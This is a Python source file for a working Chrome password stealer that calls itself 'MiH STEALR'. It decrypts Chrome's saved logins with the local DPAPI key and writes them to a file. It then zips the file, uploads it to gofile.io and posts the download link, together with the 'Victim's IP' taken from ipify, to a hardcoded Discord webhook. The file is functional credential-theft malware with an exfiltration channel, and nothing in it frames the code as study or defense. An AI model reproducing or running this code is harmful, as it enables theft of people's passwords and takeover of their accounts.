import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta
import requests
import zipfile
import os

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    with open('decrypted_passwords.txt', 'w', encoding='utf-8') as output_file:
        output_file.write("___  ___          _        _         _   _\n")
        output_file.write("|  \\/  |         | |      (_)       | | | |\n")
        output_file.write("| .  . | __ _  __| | ___   _ _ __   | |_| | ___  __ ___   _____ _ __\n")
        output_file.write("| |\\/| |/ _` |/ _` |/ _ \\ | | '_ \  |  _  |/ _ \\/ _` \\ \\ / / _ \\ '_ \n")
        output_file.write("| |  | | (_| | (_| |  __/ | | | | | | | | |  __/ (_| |\\ V /  __/ | | |\n")
        output_file.write("\\_|  |_/\\__,_|\\__,_|\\___| |_|_| |_| \\_| |_|\\___|\\__,_| \\_/ \\___|_| |_|\n")
        output_file.write("\n")

        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]

            if username or password:
                output_file.write(f"Origin URL: {origin_url}\n")
                output_file.write(f"Action URL: {action_url}\n")
                output_file.write(f"Username: {username}\n")
                output_file.write(f"Password: {password}\n")
            else:
                continue

            if date_created != 86400000000 and date_created:
                output_file.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
            if date_last_used != 86400000000 and date_last_used:
                output_file.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
            output_file.write("="*50 + "\n")

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

    with zipfile.ZipFile('decrypted_passwords.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write('decrypted_passwords.txt')

    download_link = uploadToAnonfiles('decrypted_passwords.zip')

    if download_link:
        webhook_url = 'https://discord.com/api/webhooks/1174479214230110239/4XElbEnjk2OrMPEY6vkuymOKBWddEkdU1XnALK1lpDLNuratOIU8vAY5gEytC8m4-_AR' #replace by your webhook url
        ip_address = requests.get("https://api.ipify.org/").text
        embeds = {
            "avatar_url": "https://media.discordapp.net/attachments/1168866780941389934/1172967173916999810/ab67616d0000b273f9ae145ca74784398c3b6c9b.png?ex=65623dce&is=654fc8ce&hm=5846dec8fdea603dd3f7aea0f55fd46819636029b0f9f6daf87715b0f27189e2&=&width=581&height=581",
            "username": "MiH STEALR",
            "embeds": [{
                "title": "YOU'VE REACHED HEAVEN !",
                "description": f"Passwords :{download_link}",
                "fields": [
                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
                ],
            }]
        }

        response = requests.post(webhook_url, json=embeds)

        if response.status_code == 200:
            print('Message Discord envoyé avec succès !')
        else:
            print(f'Erreur {response.status_code} lors de l\'envoi du message Discord. Réponse du serveur : {response.text}')
    else:
        print('Erreur lors de l\'upload du fichier vers Anonfiles.')

def uploadToAnonfiles(path):
    try:
        return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:
        return False

if __name__ == "__main__":
    main()


